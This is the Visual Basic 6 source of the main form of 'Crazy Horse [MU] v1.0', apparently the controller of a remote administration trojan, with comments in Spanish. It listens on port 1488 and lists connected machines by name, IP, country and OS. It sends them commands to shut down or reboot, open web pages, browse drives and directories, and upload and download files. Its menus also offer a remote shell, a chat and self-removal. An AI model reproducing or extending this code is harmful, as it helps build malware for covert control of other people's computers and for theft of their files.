VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "Actskin4.ocx"
Object = "{13677477-3E5D-4A74-8C0C-C63F18FA06EF}#1.0#0"; "vbsini.ocx"
Begin VB.Form Form1 
   Caption         =   "Crazy Horse [MU] v1.0"
   ClientHeight    =   5085
   ClientLeft      =   1215
   ClientTop       =   1515
   ClientWidth     =   8655
   BeginProperty Font 
      Name            =   "Palatino Linotype"
      Size            =   9.75
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   MaxButton       =   0   'False
   ScaleHeight     =   5085
   ScaleWidth      =   8655
   Begin CtlIni.VBSIni INI 
      Left            =   7800
      Top             =   360
      _ExtentX        =   900
      _ExtentY        =   900
   End
   Begin ACTIVESKINLibCtl.Skin Skin 
      Left            =   5280
      OleObjectBlob   =   "Main.frx":0000
      Top             =   3000
   End
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   4920
      Top             =   1080
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000004&
      Height          =   390
      Left            =   105
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   4590
      Width           =   8430
   End
   Begin MSWinsockLib.Winsock WS 
      Index           =   0
      Left            =   8400
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ListView LV 
      Height          =   4410
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   8430
      _ExtentX        =   14870
      _ExtentY        =   7779
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Palatino Linotype"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   4
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Nombre"
         Object.Width           =   2647
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "IP"
         Object.Width           =   2892
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "PAIS"
         Object.Width           =   2717
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   " S.O"
         Object.Width           =   2893
      EndProperty
   End
   Begin VB.Menu MnuMain 
      Caption         =   "Main"
      Begin VB.Menu SmnuIniciar 
         Caption         =   "Iniciar"
      End
      Begin VB.Menu SmnuParar 
         Caption         =   "Parar"
      End
      Begin VB.Menu SeparadorMnu1 
         Caption         =   "-"
      End
      Begin VB.Menu SmnuEscuchar 
         Caption         =   "Listen Settings"
      End
      Begin VB.Menu jmnuCerrar 
         Caption         =   "Cerrar"
      End
   End
   Begin VB.Menu Mnu1 
      Caption         =   "1"
      Visible         =   0   'False
      Begin VB.Menu MnuServer 
         Caption         =   "Server"
         Begin VB.Menu SmnuApagarPC 
            Caption         =   "Apagar PC"
         End
         Begin VB.Menu SmnuReiniciarPC 
            Caption         =   "Reiniciar PC"
         End
         Begin VB.Menu Separador1 
            Caption         =   "-"
         End
         Begin VB.Menu SmnuDesconectar 
            Caption         =   "Desconectar"
         End
         Begin VB.Menu SmnuReconectar 
            Caption         =   "Reconectar"
         End
      End
      Begin VB.Menu MnuArchivos 
         Caption         =   "Archivos"
         Begin VB.Menu smnuSubirArchivo 
            Caption         =   "Subir Archivo"
         End
         Begin VB.Menu smnuSubir 
            Caption         =   "Manejar Archivos"
         End
      End
      Begin VB.Menu MnuVarios 
         Caption         =   "Varios"
         Begin VB.Menu SmnuShell 
            Caption         =   "Shell Remota"
         End
         Begin VB.Menu SmnuAbrirWeb 
            Caption         =   "Abrir Web"
         End
         Begin VB.Menu SmnuChatear 
            Caption         =   "Chatear"
         End
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Creando Nueva Interfaz
Dim Tmp As Long 'Variable Usada Por El Timer1
Dim Puerto As Long, Sino As String '"Puerto" Almacena el Puerto, "SINO" Almacena estado de Msgbox
Public IndexActivo As Integer 'Se Encarga de Contener el Index del Winsock Que Esta Activo, Cuando Se Conecta un Servidor a Este se le Suma 1'
Public PuertoActivo As Long 'Es El Puerto en El Que El Usuario Quiere Que se Conecten los Servidores
Public Z As Long
Dim Datos As String 'Variable del GetData de WS
Dim Data() As String 'Variable del GetData de WS
Dim Key() As String 'Variable utilizada por SmnuMSG
Public A As String, B As String ' var usada por la funcion comando
Dim Web As String
Dim Var2 'var usada para sumarle 1 al ubound del ws del evento conection request
Dim Iniciado As String 'variable del evento Form_Load Sirve para leer datos del Registro para saber si CHz ya Habia Iniciado Antes
Dim M As Byte 'Variable de la Funcion Click del SubMenu Listen Settings Para el Resultado de un Msgbox VbyesNo
Dim x As Integer 'Variables del Bucle del Timer2
Dim ServidorSeleccionado As Long 'Variable que indica el Index del Servidor seleccionado
Public CHATEO As String
Public InputNickName As String
Dim i As Long
Dim LISTARCHIVOS As ListItem
Dim GUARAGUAO As String, GUARAGUA2 As String
Dim CARPETAS As Integer, ARCHIVOS As Integer
Public COPULA As Boolean
Dim LARGOBY As Long
Dim ARCHIRECI() As Byte
Public TamAreci As Long
Dim Identificacion As Long
Public isPlugged As Boolean


Private Sub Command1_Click()
MsgBox WS().UBound
End Sub

Private Sub Command2_Click()
MsgBox IndexActivo
End Sub

Private Sub Command3_Click()
MsgBox LV.SelectedItem.Index
End Sub

Private Sub Form_DblClick()
MsgBox PuertoActivo, , ""
End Sub

Private Sub Form_Load()

Call Funciones.CargarSkin
Iniciado = GetSetting("CrazyHorse[MU] v1.0", "HKLM", "Iniciado")

    If Not Iniciado = "1" Then
        Form1.PuertoActivo = 1488
        WS(0).LocalPort = 1488
    End If
    
End Sub


Private Sub Form_Unload(Cancel As Integer)

With Form1.INI
    .Archivo = App.Path & "\Settings.CHz"
    .Seccion = "CONEXIONES"
    .Llave = "PUERTO"
    .Valor = Form1.PuertoActivo
    .GrabaIni
End With
End
End Sub

Private Sub jmnuCerrar_Click()
End
End Sub

Private Sub LV_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)

On Error Resume Next
    If LV.SelectedItem.Selected = False Then
        Exit Sub
        ElseIf Button = 2 Then
        PopupMenu Mnu1, , x, y
        A = LV.SelectedItem.Index
    End If
    
End Sub

Private Sub SmnuAbrirWeb_Click()
    
REPITO3:

On Error Resume Next

Web = InputBox("Escriba la Pagina a Abir (Ejemplo: http://www.google.com.ar)", "Abrir Web")

If Not Web = "" Then
    
    A = LV.SelectedItem.Index
    B = "ABRIRWEB" & "#" & Web
        Call Funciones.Comando(A, B)
    
    Else
          If Web = "" Then
            Sino = MsgBox("A Ocurrido un Error ¿Desea Cancelar la Accion?", vbYesNo, "Abrir Web")
                Select Case Sino
                Case Is = 6
                Exit Sub
                Case Is = 7
                Puerto = 0
                GoTo REPITO3:
                End Select
         End If
        
End If
        
End Sub

Private Sub SmnuApagarPC_Click()

    A = LV.SelectedItem.Index
    B = "APAGARPC" & "#"
        Call Funciones.Comando(A, B)
        
End Sub


Private Sub SmnuChatear_Click()

InputNickName = InputBox("Escriba Su NickName Para el Chat", "CHAT")
If InputNickName = "" Then
MsgBox "Tiene Que Escribir un Nick", vbCritical, "Error"
Exit Sub
End If
A = LV.SelectedItem.Index
B = "NICK" & "#" & "NICKY" & InputNickName
    Call Funciones.Comando(A, B)
    
FrmChat.Show
FrmChat.Text1.Text = InputNickName & " a Iniciado Sesión..."

End Sub

Private Sub SmnuDesconectar_Click()
    
    A = LV.SelectedItem.Index
    B = "DESCONECTAR" & "#"
        Call Funciones.Comando(A, B)
    
End Sub

Private Sub SmnuEliminarme_Click()
    
    A = LV.SelectedItem.Index
    A = (A - 1)
    B = "ELIMINARME" & "#"
        Call Funciones.Comando(A, B)
        
End Sub

Private Sub SmnuEscuchar_Click()

If WS(IndexActivo).State = 2 Then
    M = MsgBox("Para Configurar Poder Configurar su Puerto, Se Debe Detener la Escucha del Puerto Activo" & vbCrLf & "¿Desea Continuar?", vbYesNo, "Listen Settings")
        If M = 6 Then
            Me.Enabled = False
            Call Funciones.Winsock_Stop
            Form2.Show
        Else
            Exit Sub
        End If
Else
    Me.Enabled = False
    Form2.Show
End If

End Sub



Private Sub SmnuIniciar_Click()

Call Funciones.LeerPuertoDeINI
WS(0).LocalPort = Form1.PuertoActivo
Call Funciones.Winsock_Listen
Call Funciones.Winsock_Start_State

End Sub

Private Sub SmnuParar_Click()

    Call Funciones.Winsock_Stop
    
End Sub


Private Sub SmnuReconectar_Click()
    
    A = LV.SelectedItem.Index
    B = "RECONECTAR" & "#"
        Call Funciones.Comando(A, B)
        
End Sub

Private Sub SmnuReiniciarPC_Click()
    
    A = LV.SelectedItem.Index
    B = "REINICIARPC" & "#"
        Call Funciones.Comando(A, B)
            
End Sub


Private Sub SmnuSubir_Click()

Form3.Show

End Sub

Private Sub smnuSubirArchivo_Click()
Form4.Show

End Sub


Private Sub Timer1_Timer()

End Sub

Private Sub Timer2_Timer()

On Error Resume Next
    
    With LV.ListItems
        For x = 0 To .Count
        DoEvents
        If Not WS(Val(.Item(x).Key)).State = sckConnected Then
            .Remove x
            LV.Refresh
        End If
        Next
    End With






End Sub

Private Sub WS_ConnectionRequest(Index As Integer, ByVal requestID As Long)

On Error Resume Next
i = 0

For i = 0 To WS().UBound
    If WS(i).State = sckClosed Then
    Text1.Text = "Conexion!!!"
        WS(i).Accept requestID
        Identificacion = WS(i)
        Exit Sub
    End If
Next
      
        IndexActivo = Val(IndexActivo) + 1
        Text1.Text = "Conexion!!!"
        WS(Index).Close
        WS(Index).Accept requestID
        Identificacion = WS(Index)
        Load WS(IndexActivo)
        WS(IndexActivo).Listen
        
End Sub

Private Sub WS_DataArrival(Index As Integer, ByVal bytesTotal As Long)
On Error Resume Next
                If COPULA = True Then
                LARGOBY = Val(LARGOBY) + bytesTotal
                WS(Index).GetData ARCHIRECI
                Put #1, , ARCHIRECI
                    If LARGOBY >= TamAreci Then
                    Close #1
                    BANDERASA = False
                    Bj = 0
                    End If
                Exit Sub
                
                End If
                
    WS(Index).GetData Datos
    
        Data() = Split(Datos, "#")
        
        Select Case Data(0)
                
                Case "DATILLOS"
                    With LV.ListItems.Add(, Index & "#", Data(1))
                        .SubItems(1) = WS(Index).RemoteHostIP
                        .SubItems(2) = Data(2)
                        .SubItems(3) = Data(3)
                    End With
                    LV.ListItems.Add Index, Identificacion
                    LV.Refresh
               
                Case "BYTASO"
                TamAreci = Data(1)
                Form1.COPULA = True
                Call Funciones.Comando(Form1.A, "BAJAR" & "#" & Form3.Combo1.Text & Form3.LVA.SelectedItem.Text)
                
                Case "ENVIOEXITOSO"
    
                    Form4.Command1.BackColor = vbGreen
                    Form4.Command1.Caption = "CHz"
                
                Case "MANDALOCAPORO"
                    
                    Call Form4.MANDANDOSELO
                                
                Case "CHAT"
                    Data() = Split(Datos, "TALK")
                    CHATEO = Data(1)
                    FrmChat.Text1 = FrmChat.Text1 & vbCrLf & "Servidor Dice: " & CHATEO
                
                Case "CHATEXITOSO"
                    Data() = Split(Datos, "#")
                    FrmChat.Text1.Text = FrmChat.Text1.Text & vbCrLf & "Servidor a Iniciado Sesion..."
                    
                Case "CHATDESCONECTADO"
                    Data() = Split(Datos, "#")
                    FrmChat.Text1.Text = "Servidor a Cerrado Sesion..."
                    
                Case "DISCOS"
                    
                    Data() = Split(Datos, "#")
                    
                        For i = 0 To Data(1) - 1
                            Data(i + 2) = Left(Data(i + 2), 2)
                            Form3.Combo1.AddItem Data(i + 2)
                        Next

                Case "DIR"
                
                Form3.LVA.ListItems.Clear
                Form3.LVA.ListItems.Add , , "..."
                
                    Data() = Split(Datos, "#")
                        
                        For i = 0 To Data(1) - 1
                        
                            CARPETAS = i
                            GUARAGUAO = Right(Data(i + 2), Len(Data(i + 2)) - InStrRev(Data(i + 2), "\"))
                            GUARAGUA2 = Right(Data(i + 2), Len(Data(i + 2)) - InStrRev(Data(i + 2), "."))
                        
                            Data(i + 2) = GUARAGUAO
                            Set LISTARCHIVOS = Form3.LVA.ListItems.Add(, , Data(i + 2))
                            LISTARCHIVOS.SubItems(1) = "CARPETA"
                            
                            ARCHIVOS = ARCHIVOS + 1
                            
                        Next
                        
                        B = "ARCHIVOS" & "#" & "ARCHIS" & "#" & Form3.Combo1.Text
                        Call Funciones.Comando(A, B)
                        
                
                Case "ARCHIS"
                    
                    Data() = Split(Datos, "#")
                        
                        For i = 0 To Data(1) - 1
                        
                            GUARAGUAO = Left(Data(i + 2), Len(Data(i + 2)) + InStrRev(Data(i + 2), "."))
                            GUARAGUA2 = Right(Data(i + 2), Len(Data(i + 2)) - InStrRev(Data(i + 2), "."))
                            Data(i + 2) = GUARAGUAO
                            
                            Set LISTARCHIVOS = Form3.LVA.ListItems.Add(, , Data(i + 2))
                            LISTARCHIVOS.SubItems(1) = "ARCHIVO"
                            
                        Next
                    
               End Select
End Sub











